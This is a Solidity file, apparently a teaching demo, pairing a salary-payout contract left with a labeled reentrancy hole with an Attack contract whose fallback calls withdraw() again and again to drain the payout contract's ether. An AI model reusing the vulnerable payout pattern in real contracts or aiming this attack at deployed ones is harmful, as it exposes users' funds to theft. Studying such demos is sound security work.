// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.7;

contract SalaryDist{
    address owner = msg.sender;
    mapping(string => address) nameToAddr;
    mapping(string => uint) nameToSalary;
    mapping(string => bool) statusPaid;

    //owners functions to set employer details

    function setSalary(string calldata _name, address _addr,uint _salary) public {
        require(msg.sender == owner,"only contract owner can set salary");
        nameToSalary[_name] = _salary;
        nameToAddr[_name] = _addr;
        statusPaid[_name] = false;
    }
    
    function setStatus(string memory _name, bool _status) public {
        require(msg.sender == owner,"only owner can use this functions");
        statusPaid[_name] = _status;
    }


    //to send ether to contract
    receive() external payable {}
    fallback() external payable{}

    //function for employ to transfer full salary to registered ethereum address

    function withdraw(string memory _name) public  {
        require(statusPaid[_name] == false,"already been paid");
        //interchange next two lines to remove re-entrency vulnerability
        (bool success, ) = payable(nameToAddr[_name]).call{value: nameToSalary[_name]}("");
        statusPaid[_name] = true;

    }


}


contract Attack{
    SalaryDist public salaryDist;
    string _name = "attackerName";
    fallback() external payable{
        if (address(salaryDist).balance > 1000000000000000000){
            salaryDist.withdraw(_name);
        }
    }
    constructor(address payable _addr) {
        salaryDist = SalaryDist(_addr);
    }

    function getBalance(address _addr) public view returns(uint){
        return _addr.balance;
 
    }
    function getBalanceCont() public view returns(uint){
       return address(salaryDist).balance;
    }

}
